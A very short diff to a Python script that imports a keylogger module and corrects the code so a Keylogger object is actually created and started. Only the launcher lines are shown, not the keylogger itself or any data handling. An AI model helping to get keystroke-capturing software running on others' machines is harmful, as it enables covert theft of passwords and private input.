@@ -2,5 +2,5 @@
 
 import keylogger
 
-keylogger = keylogger.Keylogger
+keylogger = keylogger.Keylogger()
 keylogger.start()
